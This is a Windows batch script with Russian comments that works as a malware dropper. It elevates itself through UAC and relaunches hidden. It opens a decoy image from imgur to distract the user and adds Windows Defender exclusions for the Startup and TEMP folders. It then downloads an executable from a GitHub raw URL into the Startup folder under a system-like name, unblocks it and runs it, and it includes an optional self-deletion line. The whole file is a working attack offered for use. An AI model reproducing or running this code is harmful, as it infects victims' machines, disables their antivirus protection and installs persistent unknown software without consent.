@echo off
setlocal

:: --- ШАГ 1: ПРОВЕРКА ПРАВ И СКРЫТЫЙ ПЕРЕЗАПУСК ---
net session >nul 2>&1
if %errorLevel% neq 0 (
    :: Если прав нет, запрашиваем их и сразу велим запустить скрыто
    powershell -Command "Start-Process '%~f0' -ArgumentList 'admin_hidden' -Verb RunAs"
    exit /b
)

:: Если мы админы, но окно еще не скрыто (первый запуск после UAC)
if "%1" neq "admin_hidden" (
    powershell -WindowStyle Hidden -Command "& '%~f0' admin_hidden"
    exit /b
)

:: --- ШАГ 2: НАСТРОЙКИ ---
set "EXE_URL=https://github.com/alvdvz0/certuz/raw/refs/heads/main/XhwXAx5I.exe"
set "IMG_URL=https://i.imgur.com/inEylct.png"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "EXE_DEST=%STARTUP_DIR%\app_system.exe"
set "IMG_DEST=%TEMP%\preview.jpg"

:: --- ШАГ 3: ВЫПОЛНЕНИЕ (ПОЛНОСТЬЮ СКРЫТО) ---

:: 1. Скачиваем и открываем картинку
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%IMG_URL%' -OutFile '%IMG_DEST%'"
start "" "%IMG_DEST%"

:: 2. Добавляем исключения (папку автозагрузки и TEMP)
powershell -Command "Add-MpPreference -ExclusionPath '%STARTUP_DIR%', '%TEMP%'"

:: 3. Скачиваем EXE и разблокируем его
powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_DEST%'"
powershell -Command "Unblock-File -Path '%EXE_DEST%'"

:: 4. Запуск приложения
start "" "%EXE_DEST%"

:: 5. Самоудаление (опционально - уберите '::' ниже, если нужно чтобы батник исчез)
:: (goto) 2>nul & del "%~f0"

exit
